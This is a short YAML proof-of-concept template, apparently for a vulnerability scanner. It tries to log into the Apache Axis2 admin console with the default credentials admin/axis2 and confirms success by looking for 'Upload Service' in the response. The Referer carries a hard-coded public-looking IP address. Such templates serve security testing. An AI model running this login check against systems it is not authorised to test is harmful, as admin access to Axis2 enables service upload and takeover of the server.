name: poc-yaml-axis2-default-password
groups:
  tomcat7:
    - method: POST
      path: "/axis2/axis2-admin/login"
      headers:
        Referer: http://112.6.127.133:8090/axis2/axis2-admin/
      body: |
        userName=admin&password=axis2&submit=+Login+
      expression: |
        response.status == 200 && response.body.bcontains(b"Upload Service")
  tomcat8:
    - method: POST
      path: "/axis2/axis2-admin/login"
      headers:
        Referer: http://112.6.127.133:8090/axis2/axis2-admin/welcome
      body: |
        userName=admin&password=axis2&submit=+Login+
      follow_redirects: true
      expression: |
        response.status == 200 && response.body.bcontains(b"Upload Service")
detail:
  author: flyinbed
  links:
    - "https://blog.csdn.net/weixin_33850015/article/details/86353251"
